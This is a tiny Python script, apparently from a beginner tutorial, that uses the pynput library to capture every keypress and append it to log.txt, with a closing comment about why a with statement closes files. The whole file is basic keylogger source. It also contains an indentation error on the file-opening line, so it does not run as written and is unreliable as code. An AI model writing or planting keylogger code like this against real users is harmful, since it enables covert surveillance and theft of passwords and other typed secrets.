from pynput.keyboard import Listener


def writetofile(key):
    letter = str(key)
    
    
 with open("log.txt", 'a') as f:
        f.write(letter)
        
        
with Listener(on_press=writetofile) as l:
    l.join()

#The advantage of using a with statement is that it is guaranteed to close the file no matter how the nested block exits.
 



